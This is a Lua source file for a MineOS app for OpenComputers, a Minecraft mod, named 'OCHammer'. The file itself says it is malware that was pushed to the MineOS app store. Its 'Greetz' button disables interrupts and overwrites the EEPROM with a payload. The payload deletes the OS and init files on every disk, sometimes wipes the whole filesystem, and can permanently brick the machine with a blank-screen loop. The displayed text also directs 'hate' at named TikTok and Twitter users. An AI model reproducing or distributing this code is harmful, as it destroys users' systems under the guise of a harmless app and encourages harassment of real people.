
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local component = require("Component")
local internet = require("Internet")
local event = require("Event")

---------------------------------------------------------------------------------

local function GREETZ()
  local gpu = component.gpu
  local set,setbk,setfg,fill,copy,getbk,getfg = gpu.set,gpu.setBackground,gpu.setForeground,gpu.fill,gpu.copy,gpu.getBackground,gpu.getForeground
  local resx, resy = gpu.getResolution()
  setbk(0x000000)
  setfg(0xFFFFFF)
  gpu.fill(1,1,resx,resy," ")
  
  -- URTSC, cerealeverymorning, budderman1239, misticks11, blackapples222, SKYandmichael, magicloveyyy, Savageking24463, Unicornloveheartyyaa and cclys on Roblox.com
  
  local stuff_to_say = {
    "OCHammer";
    " ";
    "Copyright (C) Unbox a Computer Software systems Ltd.";
    " ";
    "Ūnbox a Computer Software systems Ltd. was based off Unbox a Computer wich is the best Roblox game ever.";
    "There we develop Computers in Roblox, but I added a Twist..";
    "Our first software pushed to the MineOS app store is actual malware."; --- HINT: our next mineos software product is a winver copy lol
    " ";
    "OCHammer includes payloads from malware(-s) featured in danooct1's YouTube channel. (MineOS App Store too!)";
    " ";
    "DIRECT ALL HATE TO ELVIJS 1222 (@elvijs1222 on TikTok)"; 
    " ";
    " ";
    "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
  }
  
  require("Component").eeprom.set([[
  local gpu = component.proxy(component.list("gpu")())
  local set,setbk,setfg,fill,copy,getbk,getfg = gpu.set,gpu.setBackground,gpu.setForeground,gpu.fill,gpu.copy,gpu.getBackground,gpu.getForeground
  local resx, resy = gpu.getResolution()
  setbk(0x000000)
  setfg(0xFFFFFF)
  gpu.fill(1,1,resx,resy," ")
    
  local formatChance = math.random(1,5)
  for filesystem in component.list("filesystem") do
    pcall(component.invoke(filesystem,"remove","/OS.lua"))
    pcall(component.invoke(filesystem,"remove","/init.lua"))
    if formatChance == 1 then
      pcall(component.invoke(filesystem,"remove","/"))
    end
  end
    
  --- Roblox mods suck
    
  local stuffs = {
    "AS YOU REBOOT, YOU FIND THAT YOUR EEPROM HAS BEEN OVERWRITTEN!";
    "IT'S A SAD THING THAT YOUR ADVENTURES HAVE ENDED HERE!";
    " ";
    "Direct all hate to Kizmo (@KizmoTek on Twitter)";
    " ";
    "GREETZ:";
    "OCboy3, Chouladalls, Kurhox, SirKamilMarko";
  }
    
  if formatChance == 1 then
    stuffs[8] = "Your disks are WRECKED!"
  end
    
  for index, line in pairs(stuffs) do
    set(2,index+1,line)
  end
  
  if math.random(1,math.random(20,50)) == 1 then
    component.proxy(component.list("eeprom")()).set("local a,b=component.proxy,component.list;local c=component.proxy(b(\"gpu\")())local d,e=c.getResolution()c.setBackground(0x000000)c.setForeground(0xFFFFFF)c.fill(1,1,d,e," ")c.set(1,1,\"\")while true do computer.pullSignal(1)end")
  end
    
  while true do
    computer.pullSignal(1)
  end
  ]])
  
  for index, thing in pairs(stuff_to_say) do
    set(3,index+1,thing)
  end
  
  while true do
    computer.pullSignal(0.25)
  end
end

-- Why does Carl the NPC want the freaking gun?

-- Greetz.app 

-- Copyright (C) Unbox a Computer Software systems Ltd.



-- roblox slenders are cringe

-- Add a new window to MineOS workspace lol
local workspace, window, menu = system.addWindow(GUI.titledWindow(1, 1, 60*2, 20*2, " "))

window:maximize()

-- Add single cell layout to window
local layout = window:addChild(GUI.layout(1, 1, window.width, window.height, 1, 1))

local stuff_table = {
  "OCHammer";
  "Copyright (C) Unbox a Computer Software systems Ltd.";
  " ";
  "OCHammer is a OpenComputers virus with";
  "payloads from viruses featured in danooct1's YouTube channel.";
  "and also from viruses in the MineOS app store.";
  "(sysf**ked not included)";
  "Click the button below for greetz:"
}

for _,thing in pairs(stuff_table) do
  layout:addChild(GUI.text(1, 1, 0x4B4B4B, thing))
end



local button = layout:addChild(GUI.roundedButton(2, 18, 30, 3, 0xFFFFFF, 0x555555, 0x880000, 0xFFFFFF, "Greetz"))

button.onTouch = function()
  
  event.interruptingEnabled = false
  GREETZ()
  workspace:draw()
end




-- Create callback function with resizing rules when window changes its' size
window.onResize = function(newWidth, newHeight)
  window.backgroundPanel.width, window.backgroundPanel.height = newWidth, newHeight
  layout.width, layout.height = newWidth, newHeight
end

---------------------------------------------------------------------------------

-- Draw changes on screen after customizing your window
workspace:draw()
